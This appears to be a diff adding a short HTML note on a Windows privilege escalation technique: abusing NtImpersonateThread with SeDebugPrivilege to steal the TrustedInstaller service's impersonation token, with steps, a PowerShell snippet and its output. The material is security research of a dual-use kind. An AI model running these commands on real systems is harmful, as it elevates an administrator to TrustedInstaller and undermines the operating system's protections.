@@ -1,0 +1,22 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Via Thread_Direct_Impersonation</title>
+</head><body>We can use the NtImpersonateThread API, which allows you capture the impersonation context from an existing thread and apply it to another. The way impersonation contexts work is the kernel will try and capture the impersonation token for the thread first. If there is no existing impersonation token then it’ll take a copy of the primary token of the process associated with thread and impersonate that instead. And the beauty of the NtImpersonateThread API, like setting the parent process, doesn’t require permission to access the token, it just required THREAD_DIRECT_IMPERSONATION access to a thread which we can get due to SeDebugPrivilege. We can therefore get an impersonation thread without a new process by the following steps:<br/>
+Open process with at least PROCESS_QUERY_INFORMATION access to list its threads.<br/>
+Open the first thread in the process with THREAD_DIRECT_IMPERSONATION access. We’ll assume that the thread isn’t impersonating some lowly user.<br/>
+Call NtImpersonateThread to steal an impersonation token.<br/>
+<br/>
+Start-Service TrustedInstaller<br/>
+$p = Get-NtProcess -Name TrustedInstaller.exe<br/>
+$th = $p.GetFirstThread()<br/>
+$current = Get-NtThread -Current -PseudoHandle<br/>
+$imp = $current.ImpersonateThread($th)<br/>
+$imp_token = Get-NtToken -Impersonation<br/>
+$imp_token.Groups | Where-Object {$_.$id.Name -match "TrustedInstaller"}<br/>
+Name<br/>
+--------<br/>
+NT SERVICE\TrustedInstaller<br/>
+<br/>
+</body></html>
